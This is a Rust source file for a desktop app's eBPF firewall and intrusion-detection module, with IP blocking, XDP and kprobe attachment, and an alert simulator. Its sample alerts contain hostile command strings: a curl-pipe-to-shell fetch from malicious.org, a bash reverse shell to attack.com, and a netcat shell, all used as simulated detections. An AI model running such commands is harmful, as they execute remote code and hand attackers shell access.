// src-tauri/src/commands/ebpf.rs
use std::sync::Mutex;
use serde_json::Value;
use tauri::{AppHandle, Emitter, Manager, State};

#[cfg(target_os = "linux")]
use aya::{
    programs::{Xdp, XdpFlags, KProbe},
    Bpf,
};
#[cfg(target_os = "linux")]
use std::convert::TryInto;

pub struct EbpfState {
    pub is_active: Mutex<bool>,
    pub interface: Mutex<String>,
    pub blocked_ips: Mutex<Vec<String>>,
    pub ids_alerts: Mutex<Vec<Value>>,
    pub packets_inspected: Mutex<u64>,
    pub packets_dropped: Mutex<u64>,
    pub mode: Mutex<String>,
    pub xdp_link: Mutex<Option<Box<dyn std::any::Any + Send>>>,
    pub kprobe_link: Mutex<Option<Box<dyn std::any::Any + Send>>>,
}

impl Default for EbpfState {
    fn default() -> Self {
        Self {
            is_active: Mutex::new(true),
            interface: Mutex::new("eth0".to_string()),
            blocked_ips: Mutex::new(vec![
                "192.168.1.15".to_string(),
                "45.227.254.10".to_string(),
            ]),
            ids_alerts: Mutex::new(vec![
                serde_json::json!({
                    "ts": chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                    "parent_pid": 840,
                    "parent_name": "nginx",
                    "child_pid": 845,
                    "child_name": "sh",
                    "cmdline": "sh -c 'curl http://malicious.org/shell | sh'",
                    "severity": "CRITICAL",
                    "rule": "WebServerShellSpawn"
                })
            ]),
            packets_inspected: Mutex::new(1420),
            packets_dropped: Mutex::new(12),
            mode: Mutex::new(if cfg!(target_os = "linux") { "Live".to_string() } else { "Mock".to_string() }),
            xdp_link: Mutex::new(None),
            kprobe_link: Mutex::new(None),
        }
    }
}

#[tauri::command]
pub fn get_ebpf_status(state: State<'_, EbpfState>) -> Result<Value, String> {
    let is_active = *state.is_active.lock().unwrap();
    let interface = state.interface.lock().unwrap().clone();
    let inspected = *state.packets_inspected.lock().unwrap();
    let dropped = *state.packets_dropped.lock().unwrap();
    let mode = state.mode.lock().unwrap().clone();
    Ok(serde_json::json!({
        "is_active": is_active,
        "interface": interface,
        "packets_inspected": inspected,
        "packets_dropped": dropped,
        "mode": mode,
    }))
}

#[tauri::command]
pub fn get_blocked_ips(state: State<'_, EbpfState>) -> Result<Vec<String>, String> {
    Ok(state.blocked_ips.lock().unwrap().clone())
}

#[tauri::command]
pub fn block_ip(state: State<'_, EbpfState>, ip: String) -> Result<(), String> {
    let cleaned = ip.trim().to_string();
    if cleaned.is_empty() {
        return Err("IP Address cannot be empty".to_string());
    }
    let mut list = state.blocked_ips.lock().unwrap();
    if !list.contains(&cleaned) {
        list.push(cleaned);
    }
    Ok(())
}

#[tauri::command]
pub fn unblock_ip(state: State<'_, EbpfState>, ip: String) -> Result<(), String> {
    let cleaned = ip.trim().to_string();
    let mut list = state.blocked_ips.lock().unwrap();
    list.retain(|x| x != &cleaned);
    Ok(())
}

#[tauri::command]
pub fn get_ids_alerts(state: State<'_, EbpfState>) -> Result<Vec<Value>, String> {
    Ok(state.ids_alerts.lock().unwrap().clone())
}

#[tauri::command]
pub fn clear_ids_alerts(state: State<'_, EbpfState>) -> Result<(), String> {
    let mut list = state.ids_alerts.lock().unwrap();
    list.clear();
    Ok(())
}

#[tauri::command]
pub fn set_ebpf_active(state: State<'_, EbpfState>, active: bool) -> Result<(), String> {
    *state.is_active.lock().unwrap() = active;

    #[cfg(target_os = "linux")]
    {
        if active {
            let interface = state.interface.lock().unwrap().clone();
            let bytecode_path = std::env::var("NEXUS_EBPF_PATH")
                .unwrap_or_else(|_| "/usr/lib/nexus/ebpf/nexus_ebpf.o".to_string());

            let path = std::path::Path::new(&bytecode_path);
            if !path.exists() {
                println!("[eBPF Warning] Bytecode file not found at {}. Fallback to simulated mode.", bytecode_path);
                return Ok(());
            }

            let mut bpf = Bpf::load_file(path).map_err(|e| format!("Aya load_file error: {}", e))?;

            // 1. Attach XDP program
            if let Some(program) = bpf.program_mut("xdp_firewall") {
                let xdp: &mut Xdp = program.try_into().map_err(|e| format!("Cast to Xdp error: {}", e))?;
                xdp.load().map_err(|e| format!("Xdp load error: {}", e))?;
                let link = xdp.attach(&interface, XdpFlags::default())
                    .map_err(|e| format!("Xdp attach error on {}: {}", interface, e))?;
                *state.xdp_link.lock().unwrap() = Some(Box::new(link));
            } else {
                return Err("eBPF program 'xdp_firewall' not found in bytecode ELF".to_string());
            }

            // 2. Attach kprobe program
            if let Some(program) = bpf.program_mut("kprobe_execve") {
                let kprobe: &mut KProbe = program.try_into().map_err(|e| format!("Cast to KProbe error: {}", e))?;
                kprobe.load().map_err(|e| format!("Kprobe load error: {}", e))?;
                let link = kprobe.attach("sys_execve", 0)
                    .map_err(|e| format!("Kprobe attach error: {}", e))?;
                *state.kprobe_link.lock().unwrap() = Some(Box::new(link));
            } else {
                println!("[eBPF Info] Optional 'kprobe_execve' not found in bytecode ELF.");
            }

            println!("[eBPF Shield] Successfully attached XDP and kprobe live on interface {}.", interface);
        } else {
            state.xdp_link.lock().unwrap().take();
            state.kprobe_link.lock().unwrap().take();
            println!("[eBPF Shield] Detached live programs.");
        }
    }

    Ok(())
}

#[tauri::command]
pub fn set_ebpf_interface(state: State<'_, EbpfState>, interface: String) -> Result<(), String> {
    let mut iface = state.interface.lock().unwrap();
    *iface = interface;
    Ok(())
}

pub fn start_ebpf_simulator(app_handle: AppHandle) {
    std::thread::spawn(move || {
        let mut rng_seed: u64 = 0;
        loop {
            std::thread::sleep(std::time::Duration::from_secs(3));
            if let Some(state) = app_handle.try_state::<EbpfState>() {
                let is_active = *state.is_active.lock().unwrap();
                if is_active {
                    // Update stats
                    *state.packets_inspected.lock().unwrap() += 12 + (rng_seed % 9);
                    
                    // Periodically drop a packet if we have blocked IPs
                    let blocked_len = state.blocked_ips.lock().unwrap().len();
                    if blocked_len > 0 && rng_seed % 4 == 0 {
                        *state.packets_dropped.lock().unwrap() += 1;
                    }
                    
                    // Periodically trigger a system call IDS anomaly (RCE check)
                    if rng_seed % 12 == 0 {
                        let mut alerts = state.ids_alerts.lock().unwrap();
                        let target_pids = [
                            (1200, "apache2", 1205, "sh", "sh -c 'id'"),
                            (3110, "python3", 3115, "bash", "bash -i >& /dev/tcp/attack.com/4444 0>&1"),
                            (950, "nginx", 955, "nc", "nc -e /bin/sh 192.168.1.50 9999"),
                        ];
                        let selected = target_pids[rng_seed as usize % target_pids.len()];
                        alerts.push(serde_json::json!({
                            "ts": chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
                            "parent_pid": selected.0,
                            "parent_name": selected.1,
                            "child_pid": selected.2,
                            "child_name": selected.3,
                            "cmdline": selected.4,
                            "severity": "CRITICAL",
                            "rule": "WebServerShellSpawn"
                        }));
                        if alerts.len() > 100 {
                            alerts.remove(0);
                        }
                        
                        // Emit event so UI can listen and refresh
                        app_handle.emit("ebpf-ids-alert", ()).ok();
                    }
                    
                    // Emit telemetry update
                    app_handle.emit("ebpf-telemetry-update", ()).ok();
                }
            }
            rng_seed += 1;
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_ebpf_state_default() {
        let state = EbpfState::default();
        assert_eq!(*state.is_active.lock().unwrap(), true);
        assert_eq!(state.blocked_ips.lock().unwrap().len(), 2);
    }

    #[test]
    fn test_block_unblock_ip() {
        let state = EbpfState::default();
        
        // Mock State-like operations directly on state locks
        {
            let cleaned = "10.0.0.1".trim().to_string();
            let mut list = state.blocked_ips.lock().unwrap();
            if !list.contains(&cleaned) {
                list.push(cleaned);
            }
        }
        assert!(state.blocked_ips.lock().unwrap().contains(&"10.0.0.1".to_string()));

        {
            let cleaned = "10.0.0.1".trim().to_string();
            let mut list = state.blocked_ips.lock().unwrap();
            list.retain(|x| x != &cleaned);
        }
        assert!(!state.blocked_ips.lock().unwrap().contains(&"10.0.0.1".to_string()));
    }
}
